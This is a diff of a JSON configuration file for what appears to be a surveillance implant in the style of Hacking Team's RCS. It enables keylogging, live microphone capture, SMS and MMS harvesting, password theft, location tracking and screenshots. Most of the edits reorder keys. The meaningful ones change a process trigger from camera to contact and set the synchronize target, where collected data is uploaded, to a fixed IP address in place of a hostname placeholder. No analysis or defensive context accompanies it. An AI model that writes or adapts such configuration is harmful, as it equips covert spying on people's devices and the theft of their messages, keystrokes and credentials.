@@ -22,11 +22,11 @@
         {"module": "keylog", "_type": "desktop,mobile", "_platform": "windows,osx,ios,linux"},
         {"module": "livemic", "_type": "mobile", "_platform": "winmo", "number": ""},
         {
+            "module": "messages",
             "mms": {
                 "enabled": true,
                 "filter": {"datefrom": "2014-09-09 00:00:00", "dateto": "2100-01-01 00:00:00", "history": true}
             },
-            "module": "messages",
             "sms": {
                 "enabled": true,
                 "filter": {"datefrom": "2014-09-09 00:00:00", "dateto": "2100-01-01 00:00:00", "history": true}
@@ -41,7 +41,7 @@
                 }
             }
         },
-        {"autosense": false, "module": "mic", "threshold": 0.22, "silence": 5},
+        {"module": "mic", "autosense": false, "threshold": 0.22, "silence": 5},
         {"module": "password"},
         {"gps": false, "module": "position", "cell": true, "wifi": true},
         {"module": "screenshot", "quality": "med", "onlywindow": false},
@@ -110,15 +110,15 @@
         },
         {
             "start": 6,
-            "end": 7,
             "event": "process",
-            "process": "*camera*",
+            "process": "*contact*",
             "delay": 5,
             "enabled": true,
-            "focus": false,
+            "end": 7,
             "iter": 1,
             "window": false,
             "desc": "",
+            "focus": false,
             "repeat": 8
         }
     ],
@@ -146,10 +146,10 @@
                 {
                     "action": "synchronize",
                     "maxdelay": 0,
-                    "stop": false,
-                    "host": "$(HOSTNAME)",
-                    "bandwidth": 500000,
                     "cell": false,
+                    "host": "192.168.100.193",
+                    "bandwidth": 500000,
+                    "stop": false,
                     "wifi": true,
                     "mindelay": 0
                 }
@@ -165,14 +165,14 @@
         }
     ],
     "globals": {
-        "migrated": false,
         "remove_driver": true,
         "advanced": true,
         "quota": {"min": 104857.6, "max": 104857600},
         "collapsed": false,
         "nohide": [],
+        "migrated": false,
         "type": "mobile",
-        "version": 2012041601,
-        "wipe": false
+        "wipe": false,
+        "version": 2012041601
     }
 }
